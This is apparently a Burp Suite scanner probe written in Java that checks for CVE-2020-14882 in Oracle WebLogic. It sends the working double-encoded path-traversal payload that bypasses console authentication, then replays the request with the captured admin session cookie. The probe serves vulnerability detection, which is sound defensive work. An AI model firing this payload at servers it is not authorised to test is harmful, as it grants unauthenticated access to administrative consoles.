package probes;

import burp.*;

import java.util.List;

public class CVE_2020_14882 extends Probe {
    private static final String NAME = "CVE-2020-14882";
    private static final String SEVERITY = "High";
    private static final String DESC = "Vulnerability in the Oracle WebLogic Server product of Oracle Fusion Middleware (component: Console). Supported versions that are affected are 10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0 and 14.1.1.0.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via HTTP to compromise Oracle WebLogic Server. Successful attacks of this vulnerability can result in takeover of Oracle WebLogic Server. CVSS 3.1 Base Score 9.8 (Confidentiality, Integrity and Availability impacts).";

    @Override
    public IScanIssue check(IHttpRequestResponse requestResponse) {
        String payload = "/console/css/%252e%252e%252fconsole.portal";

        IHttpRequestResponse checkReqResp = getReq(requestResponse.getHttpService(), payload);

        IResponseInfo resp = Utilities.helpers.analyzeResponse(checkReqResp.getResponse());
        List<ICookie> setCookie = resp.getCookies();
        if (setCookie.size() > 0) {
            byte[] req = checkReqResp.getRequest();
            for (ICookie cookie : setCookie) {
                if (cookie.getName().equals("ADMINCONSOLESESSION")) {
                    req = Utilities.replaceOrAddHeader(
                            req,
                            "Cookie",
                            cookie.getName() + "=" + cookie.getValue());
                    break;
                }
            }
            checkReqResp = Utilities.callbacks.makeHttpRequest(checkReqResp.getHttpService(), req);
        }

        if (Utilities.getStatus(checkReqResp) == 200) {
            return new WebLogicIssue(checkReqResp, NAME, DESC, SEVERITY);
        }
        return null;
    }
}
